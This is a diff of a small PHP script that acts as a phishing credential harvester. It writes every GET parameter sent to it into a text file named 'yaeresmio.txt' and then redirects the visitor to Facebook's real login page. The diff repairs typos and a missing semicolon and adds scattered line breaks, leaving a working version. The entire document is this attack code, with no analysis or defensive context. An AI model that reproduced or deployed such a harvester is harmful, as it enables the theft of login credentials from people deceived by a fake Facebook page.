@@ -1,19 +1,22 @@
 <?php
 header("Location: http://www.Facebook.com/login.php ");
-$handle = fopen("yaeresmio.txt", "a"); 
+$handle = 
+	
+fopen("yaeresmio.txt", "a"); 
+foreach($_GET as 
 
-foreach($_GET as $variable => $value) {
-	fwrite($handle, $variable);
+$variable => $value) {
+fwrite($handle, 
+       
+$variable);
+fwrite($handle, "=");
 
-	fwrite($handle, "=");
-
-	fwrite($handle, $value);
-
-	fwrite($handle, "\r\n");
+fwrite($handle, $value);
+fwrite($handle, 
+       
+"\r\n");
 }
-
-frité($ande, "\r\n");
+fwrite($handle, "\r\n");
 fclose($handle);
-
-exit
+exit;
 ?>
